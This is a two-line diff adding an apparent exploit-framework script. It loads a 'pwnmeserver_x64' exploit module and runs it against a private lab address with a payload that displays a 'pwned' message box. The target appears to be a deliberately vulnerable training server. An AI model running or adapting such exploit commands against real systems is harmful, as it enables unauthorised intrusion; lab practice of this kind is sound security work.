@@ -1,0 +1,2 @@
+load pwnmeserver_x64
+pwn scripter linux_displaypwnedmsgbox rhost 192.168.56.101 rport 1025
